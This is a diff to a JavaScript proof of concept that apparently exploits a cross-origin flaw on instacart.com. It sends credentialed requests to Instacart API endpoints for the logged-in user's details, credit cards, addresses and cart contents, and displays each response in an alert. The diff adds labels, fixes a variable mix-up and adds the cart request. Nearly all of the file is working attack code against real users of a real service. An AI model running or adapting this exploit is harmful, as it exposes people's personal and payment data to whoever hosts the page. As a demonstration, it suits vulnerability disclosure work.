@@ -2,6 +2,7 @@
 var xhr2 = new XMLHttpRequest();
 xhr2.onreadystatechange = function() {
 	if (xhr2.readyState == XMLHttpRequest.DONE) {
+		alert("USER DETAIL:")
 		alert(xhr2.responseText);
 	}
 }
@@ -12,6 +13,7 @@ xhr2.send(null)
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
 	if (xhr.readyState == XMLHttpRequest.DONE) {
+		alert("CREDIT CARDS:")
 		alert(xhr.responseText);
 	}
 }
@@ -21,10 +23,22 @@ xhr.send(null)
 // 3 - Addresses
 var xhr3 = new XMLHttpRequest();
 xhr3.onreadystatechange = function() {
-	if (xhr2.readyState == XMLHttpRequest.DONE) {
-		alert(xhr2.responseText);
+	if (xhr3.readyState == XMLHttpRequest.DONE) {
+		alert("Addresses:")
+		alert(xhr3.responseText);
 	}
 }
 xhr3.withCredentials = true;
 xhr3.open('GET', 'https://www.instacart.com/v3/addresses', true);
 xhr3.send(null)
+// 4 - Cart content
+var xhr4 = new XMLHttpRequest();
+xhr4.onreadystatechange = function() {
+	if (xhr4.readyState == XMLHttpRequest.DONE) {
+		alert("Cart content:")
+		alert(xhr4.responseText);
+	}
+}
+xhr4.withCredentials = true;
+xhr4.open('GET', 'https://www.instacart.com/v3/containers/cart_info', true);
+xhr4.send(null)
